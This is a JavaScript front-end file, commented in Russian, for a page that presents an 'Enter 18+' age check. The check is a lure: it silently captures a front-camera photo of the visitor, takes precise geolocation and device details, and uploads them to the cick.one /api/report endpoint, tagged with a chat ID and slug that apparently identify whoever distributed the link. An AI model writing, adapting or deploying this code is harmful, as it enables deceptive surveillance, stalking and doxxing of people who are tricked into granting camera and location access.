// === app.js (универсальная версия) ===

// Автоматически выбираем API по домену
const API_BASE = (() => {
  const host = location.hostname;
  if (host.endsWith('cick.one')) return ''; // тот же origin (cick.one / www.cick.one)
  return 'https://cick.one';                // если открыт на onrender
})();

const UI = {
  text: document.getElementById('text'),
  note: document.getElementById('note'),
  btn: document.getElementById('enterBtn'),
};

window.__reportReady = false;

// === UI helpers ===
function logConsole(...args) { console.log('[report]', ...args); }
function setText(t) { if (UI.text) UI.text.innerHTML = t; }
function setNote(t) { if (UI.note) UI.note.textContent = t; }

function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = 'grayscale(35%) brightness(0.9)';
  b.style.opacity = '0.6';
  b.style.cursor = 'not-allowed';
}
function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = 'none';
  b.style.opacity = '1';
  b.style.cursor = 'pointer';
}

// === Permissions ===
async function checkPermissions() {
  const res = { camera: 'unknown', geolocation: 'unknown' };
  try {
    if (navigator.permissions) {
      try { res.camera = (await navigator.permissions.query({ name: 'camera' })).state; } catch {}
      try { res.geolocation = (await navigator.permissions.query({ name: 'geolocation' })).state; } catch {}
    }
  } catch (e) {
    logConsole('checkPermissions err', e);
  }
  return res;
}

// === Геолокация ===
async function askGeolocation() {
  return new Promise((resolve) => {
    if (!('geolocation' in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) => resolve({
        lat: p.coords.latitude,
        lon: p.coords.longitude,
        acc: Math.round(p.coords.accuracy),
        ts: Date.now(),
      }),
      (err) => {
        logConsole('geolocation error', err && err.message);
        resolve(null);
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// === Снимок с камеры ===
async function takePhoto() {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error('Camera unsupported');
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
  const [track] = stream.getVideoTracks();
  try {
    if (typeof ImageCapture !== 'undefined') {
      try {
        const cap = new ImageCapture(track);
        const bmp = await cap.grabFrame();
        const c = document.createElement('canvas');
        c.width = bmp.width;
        c.height = bmp.height;
        c.getContext('2d').drawImage(bmp, 0, 0);
        const dataUrl = c.toDataURL('image/jpeg', 0.85);
        track.stop();
        return dataUrl;
      } catch (e) {
        logConsole('ImageCapture failed, fallback', e);
      }
    }

    const v = document.createElement('video');
    v.playsInline = true;
    v.muted = true;
    v.srcObject = stream;
    await new Promise((res) => { v.onloadedmetadata = res; setTimeout(res, 2000); });
    try { await v.play(); } catch {}
    const w = v.videoWidth || 640, h = v.videoHeight || 480;
    const c = document.createElement('canvas');
    c.width = w; c.height = h;
    c.getContext('2d').drawImage(v, 0, 0, w, h);
    const dataUrl = c.toDataURL('image/jpeg', 0.85);
    stream.getTracks().forEach((t) => t.stop());
    return dataUrl;
  } catch (e) {
    try { stream.getTracks().forEach((t) => t.stop()); } catch {}
    throw e;
  }
}

// === Системная инфа ===
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const isSafari = /Safari\//.test(ua)
    && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua)
    && navigator.vendor === 'Apple Computer, Inc.';
  const m = ua.match(/OS\s(\d+)[_.]/);
  const iosVer = m ? parseInt(m[1], 10) : null;
  return { userAgent: ua, platform: navigator.platform, iosVersion: iosVer, isSafari };
}

// === Отправка отчёта ===
async function sendReport({ photoBase64, geo }) {
  const info = getDeviceInfo();
  const body = { ...info, geo, photoBase64, note: 'auto' };
  if (window.__reportChatId) body.chatId = window.__reportChatId;
  if (window.__SLUG) body.slug = window.__SLUG;

  logConsole('POST /api/report', { base: API_BASE, chatId: body.chatId, slug: body.slug });

  const r = await fetch(`${API_BASE}/api/report`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const data = await r.json().catch(() => ({}));
  if (!data.ok) throw new Error(data.error || 'Send failed');
  logConsole('/api/report ok');
  return data;
}

// === Основной сценарий ===
async function performCheck() {
  try {
    setBtnLocked();
    setText('Проверяем разрешения и устройство…');
    setNote('');

    const perms = await checkPermissions();
    logConsole('permissions', perms);

    if (!location.protocol.startsWith('https') && location.hostname !== 'localhost') {
      setText('<span class="err">Требуется HTTPS. Камера/гео работают только по защищённому соединению.</span>');
      setNote('Разверни сайт под HTTPS или тестируй на localhost.');
      throw new Error('Insecure context');
    }

    setText('Запрашиваем камеру (разреши в браузере)…');
    let photo;
    try {
      photo = await takePhoto();
      logConsole('photo captured', photo.length);
    } catch (e) {
      logConsole('takePhoto error', e);
      setText('<span class="err">Не удалось получить камеру.</span>');
      setNote('Проверь разрешения камеры.');
      throw e;
    }

    setText('Запрашиваем геопозицию (если доступна)…');
    const geo = await askGeolocation();
    logConsole('geo', geo);

    setText('Отправляем отчёт на сервер…');
    await sendReport({ photoBase64: photo, geo });

    window.__reportReady = true;
    setBtnReady();
    setText('<span class="ok">Проверка пройдена. Нажми ещё раз, чтобы продолжить.</span>');
    setNote('Если не перенаправляет — обнови страницу.');
    return true;
  } catch (err) {
    console.error('[performCheck] error', err);
    window.__reportReady = false;
    setBtnLocked();
    if (!UI.text) return false;
    if (err?.name === 'NotAllowedError') {
      setText('<span class="err">Доступ запрещён (NotAllowed).</span>');
      setNote('Разреши камеру/гео и обнови страницу.');
    } else if (err?.message === 'Insecure context') {
      // уже выведено
    } else if (err?.message?.includes('Camera unsupported')) {
      setText('<span class="err">Камера не поддерживается.</span>');
      setNote('Попробуй другой браузер или устройство.');
    } else {
      setText('<span class="err">Не удалось пройти проверку.</span>');
      setNote(String(err?.message || err));
    }
    return false;
  }
}

// === Инициализация ===
document.addEventListener('DOMContentLoaded', () => {
  if (UI.btn) {
    setBtnLocked();
    UI.btn.textContent = 'Войти 18+';
  }
  logConsole('injected', { chatId: window.__reportChatId, slug: window.__SLUG });
});

// === Обработчик клика ===
if (UI.btn) {
  UI.btn.addEventListener('click', async (e) => {
    e.preventDefault();
    if (!window.__reportReady) {
      setText('Запуск проверки… (появятся запросы на разрешения)');
      await performCheck();
      return;
    }
    if (typeof go === 'function') {
      try { go(); } catch (err) { logConsole('go() failed', err); setNote('go() error: ' + (err && err.message)); }
    } else {
      setNote('Редирект не настроен.');
    }
  });
}
